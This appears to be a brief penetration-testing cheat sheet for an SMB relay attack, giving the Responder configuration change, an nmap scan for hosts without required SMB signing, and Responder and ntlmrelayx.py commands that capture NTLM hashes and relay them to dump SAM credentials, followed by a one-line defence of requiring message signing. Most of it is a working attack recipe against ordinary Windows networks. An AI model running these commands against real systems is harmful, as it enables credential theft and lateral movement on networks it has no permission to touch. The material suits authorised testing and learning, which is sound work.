First go to the /opt/responder/Responder.conf and turn off SMB and HTTP to pass the NTLM hash.
(important) It should be noted that Responder cannot use the NTLM hash to the box it grabbed from.
(important) We need to make sure the account we are running this against is a local admin, since it needs to have access to SAM in order to be able to dump the SAM successfully.
nmap --script=smb2-security-mode -p445 192.168.1.20
* "Message signing enabled but not required" is what you are looking for.

(terminal-1)
python3 responder.py -I tun0 -rdw -v

(terminal-2)
python3 ntlmrelayx.py -tf /dev/shm/targets.txt -smb2support
Prevention
How to defend against this is to go to domain policy and make the message signing "required".
